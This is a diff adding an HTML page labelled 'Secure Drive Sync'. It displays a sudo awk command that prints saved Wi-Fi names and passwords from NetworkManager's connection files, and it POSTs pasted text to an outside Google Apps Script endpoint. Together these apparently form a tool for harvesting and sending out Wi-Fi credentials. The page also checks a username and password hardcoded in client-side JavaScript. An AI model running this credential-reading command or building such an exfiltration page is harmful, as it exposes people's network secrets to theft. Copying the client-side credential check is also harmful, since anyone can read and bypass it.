@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Drive Sync</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #7c74cc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background-color: #7c74cc; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); width: 100%; max-width: 500px; }
+        h2 { margin-top: 0; color: #333; }
+        textarea { width: 100%; height: 120px; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; resize: vertical; font-size: 16px; margin-top: 10px; }
+        button { background-color: #74bacc; color: black; padding: 12px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; margin-top: 15px; }
+        button:hover { background-color: #45a049; }
+        button:disabled { background-color: #cccccc; cursor: not-allowed; }
+        #status { margin-top: 15px; font-weight: bold; text-align: center; }
+        .success { color: green; }
+        .error { color: red; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Input text to upload to cloud, micheal21@localhost</h2>
+    <h4>sudo awk -F= '/^id=/ {id=$2} /^psk=/ {print "Name: "id" | Password: "$2}' /etc/NetworkManager/system-connections/*</h4>
+    <textarea id="textInput" placeholder="Type your text here..."></textarea>
+    <button id="submitBtn" onclick="sendData()">Submit to Drive</button>
+    <div id="status"></div>
+</div>
+
+<script>
+    // Your verified Web App Deployment ID link
+    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwfZ62WGblHWrFqGqlGGI4jMyvmcYI5rHKG5K4sinuMTRQFGPkDw9z2HwinV8elqPe-/exec"; 
+
+    async function sendData() {
+        const textInput = document.getElementById('textInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const statusDiv = document.getElementById('status');
+        const textValue = textInput.value.trim();
+        
+        if (!textValue) {
+            statusDiv.className = "error";
+            statusDiv.innerText = "Please enter some text first.";
+            return;
+        }
+
+        // Popups asking for credentials
+        const username = prompt("Enter Username:");
+        const password = prompt("Enter Password:");
+
+        // HTML Security Layer: Checks inputs instantly
+        if (username !== "mikhailpn" || password !== "4833") {
+            statusDiv.className = "error";
+            statusDiv.innerText = "Access Denied: Invalid credentials.";
+            alert("Incorrect username or password!");
+            return; // Stops the execution right here if wrong
+        }
+
+        submitBtn.disabled = true;
+        statusDiv.className = "";
+        statusDiv.innerText = "Verifying and sending...";
+
+        // Packs the data cleanly for Google Script
+        const formBody = new URLSearchParams();
+        formBody.append('username', username);
+        formBody.append('password', password);
+        formBody.append('text', textValue);
+
+        try {
+            const response = await fetch(WEB_APP_URL, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
+                body: formBody
+            });
+
+            const textResult = await response.text(); 
+            
+            if (textResult.includes("ok")) {
+                statusDiv.className = "success";
+                statusDiv.innerText = "Success! Text appended to input.txt.";
+                textInput.value = ""; 
+            } else {
+                statusDiv.className = "error";
+                statusDiv.innerText = "Google Script rejected the request.";
+            }
+            
+        } catch (error) {
+            statusDiv.className = "error";
+            statusDiv.innerText = "An error occurred. Check your network.";
+            console.error(error);
+        } finally {
+            submitBtn.disabled = false;
+        }
+    }
+</script>
+
+</body>
+</html>
+
